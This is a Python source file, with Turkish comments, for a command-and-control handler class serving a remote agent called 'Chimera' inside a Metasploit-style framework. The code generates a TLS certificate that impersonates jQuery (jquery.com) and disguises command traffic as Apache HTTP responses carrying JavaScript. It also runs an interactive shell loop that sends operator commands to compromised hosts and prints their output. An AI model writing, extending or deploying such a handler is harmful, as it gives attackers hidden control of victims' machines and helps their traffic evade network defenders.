"""
Chimera Multi-Handler Class (Faz 1.2)
Mevcut exploit/multi/handler mimarisine uygun özel handler sınıfı.
Gelecekteki C2 (AES-256-GCM / ECDH) protokolüne hazırlık içerir.
"""
from core.handler import BaseHandler
from core.shared_state import shared_state
import socket
import threading
import struct
import time
from rich import print
from core.handler import BaseHandler
from core.shared_state import shared_state
import socket
import threading
import struct
import time
import ssl
import os
import subprocess
from rich import print
from typing import Dict, Any, Tuple

# Sertifika dosyaları için yollar
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

class Handler(BaseHandler):
    """
    Chimera Agent için özel handler sınıfı.
    """
    def __init__(self, options: Dict[str, Any]):
        super().__init__(options)
        self.session_id = None
        self.cert_file = os.path.abspath(options.get("CERT_FILE", CERT_FILE))
        self.key_file = os.path.abspath(options.get("KEY_FILE", KEY_FILE))
        self.check_and_generate_cert()

    def check_and_generate_cert(self):
        """SSL sertifikası yoksa oluşturur."""
        if not os.path.exists(self.cert_file) or not os.path.exists(self.key_file):
            print(f"[*] SSL Sertifikası oluşturuluyor... ({self.cert_file})")
            try:
                subprocess.check_call(
                    f'openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 '
                    f'-keyout "{self.key_file}" -out "{self.cert_file}" '
                    f'-subj "/C=US/ST=California/L=San Francisco/O=jQuery Inc/CN=jquery.com"',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] Sertifika oluşturuldu.")
            except Exception as e:
                print(f"[!] Sertifika oluşturma hatası: {e}")
                print("[!] Lütfen openssl'in yüklü olduğundan emin olun.")

    def handle_connection(self, client_sock: socket.socket, session_id: int = None):
        """
        Yeni gelen bağlantıyı karşılar ve yönetir.
        """
        self.client_sock = client_sock
        self.session_id = session_id
        
        print(f"[*] Chimera Handler: Yeni bağlantı kabul edildi. (Session: {session_id})")

        # 1. SSL/TLS Handshake (Faz 1.3 - C2 Encryption)
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            
            # AES-256-GCM / ECDH kullanımını teşvik et
            # Modern SSL varsayılanları genellikle bunu yapar ama biz yine de belirtelim
            try:
                context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
            except Exception:
                pass # Sistem desteklemiyorsa varsayılanları kullan

            self.client_sock = context.wrap_socket(client_sock, server_side=True)
            cipher = self.client_sock.cipher()
            print(f"[*] Şifreli Bağlantı Kuruldu: {cipher[0]} ({cipher[1]} bit) - {cipher[2]}")
            
        except Exception as e:
            print(f"[!] SSL Handshake Hatası: {e}")
            return

        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        
        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        try:
            # İlk mesajın sysinfo olmasını bekliyoruz
            sysinfo = self.recv_data()
            if sysinfo:
                print(f"[+] Ajan Bilgisi: {sysinfo}")
                
                # Session manager'daki bilgiyi güncelle (Opsiyonel)
                if shared_state.session_manager and self.session_id:
                     session = shared_state.session_manager.get_session(self.session_id)
                     if session:
                         # Extra info olarak ekle
                         session["info"]["extra"] = sysinfo
                         # Session tipini güncelle
                         session["type"] = "Chimera"

        except Exception as e:
            print(f"[!] Handshake hatası: {e}")
            return

        # 3. Komut Döngüsü (Interactive Session)
        # Bu handler şu an için interaktif modda çalışacak.
        # İleride C2 sunucusu gibi asenkron komut kuyruğu mantığına geçebilir.
        self.interactive_session()

    def send_data(self, data: str):
        """HTTP Response olarak şifreli veri gönderir."""
        if not self.client_sock: return
        try:
            encoded_body = data.encode('utf-8')
            
            # HTTP Response Oluştur (Obfuscation)
            http_response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Server: Apache/2.4.41 (Ubuntu)\r\n"
                b"Date: " + time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()).encode() + b"\r\n"
                b"Content-Type: application/javascript; charset=utf-8\r\n"
                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
            )
            
            self.client_sock.sendall(http_response + encoded_body)
        except Exception as e:
            print(f"[!] Veri gönderme hatası: {e}")

    def recv_data(self) -> str:
        """HTTP Request içinden veriyi okur."""
        if not self.client_sock: return ""
        try:
            # Headerları oku (\r\n\r\n bulana kadar)
            header_buffer = b""
            while b"\r\n\r\n" not in header_buffer:
                chunk = self.client_sock.recv(1)
                if not chunk: return ""
                header_buffer += chunk
            
            # Content-Length bul
            headers = header_buffer.decode('utf-8', errors='ignore')
            content_length = 0
            for line in headers.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    try:
                        content_length = int(line.split(':')[1].strip())
                    except:
                        pass
            
            # Body'yi oku
            body = b""
            while len(body) < content_length:
                chunk = self.client_sock.recv(content_length - len(body))
                if not chunk: break
                body += chunk
                
            return body.decode('utf-8')
        except Exception as e:
            print(f"[!] Veri alma hatası: {e}")
            return ""

    def interactive_session(self):
        """Basit interaktif komut satırı."""
        print("-" * 50)
        print(f"[*] Chimera Session {self.session_id} aktif. Çıkmak için 'background' veya 'bg'.")
        print("-" * 50)
        
        while True:
            try:
                cmd = input(f"chimera ({self.session_id}) > ")
                if not cmd.strip(): continue
                
                if cmd.lower() in ["exit", "quit"]:
                    # Session'ı kapat
                    print("[*] Bağlantı kapatılıyor...")
                    self.send_data("terminate")
                    break
                    
                if cmd.lower() in ["background", "bg"]:
                    # Arka plana at (Session açık kalır)
                    print(f"[*] Session {self.session_id} arka plana atıldı.")
                    break

                # Komutu gönder
                self.send_data(cmd)
                
                # Cevabı bekle
                response = self.recv_data()
                if response:
                    print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    break
                    
            except KeyboardInterrupt:
                print("\n[*] Interaktif moddan çıkılıyor (Ctrl+C).")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                break
